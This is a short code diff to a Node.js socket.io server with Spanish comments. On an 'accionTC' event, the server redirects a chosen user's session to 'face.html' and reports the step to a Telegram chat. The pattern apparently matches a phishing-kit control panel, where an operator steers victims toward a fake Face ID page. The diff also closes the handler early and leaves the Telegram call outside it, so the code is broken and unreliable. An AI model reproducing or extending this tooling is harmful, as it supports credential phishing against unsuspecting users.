@@ -156,11 +156,15 @@ io.on('connection', (socket) => {
 
   // Escucha el evento para redirigir a face.html cuando se presione el botón TC
   socket.on('accionTC', ({ sessionId }) => {
-    const socketTarget = activeSockets.get(sessionId);
-    if (!socketTarget) {
-      console.log("⚠️ No se encontró la sesión del usuario.");
-      return;
-    }
+  const socketTarget = activeSockets.get(sessionId);
+  if (!socketTarget) {
+    console.log("⚠️ No se encontró la sesión del usuario.");
+    return;
+  }
+
+  // Emisión de redirección
+  socketTarget.emit('redirigir', 'face.html');
+});
 
     // Enviar mensaje a Telegram
     bot.sendMessage(telegramChatId, '🟨 Redirigiendo a Face ID...');
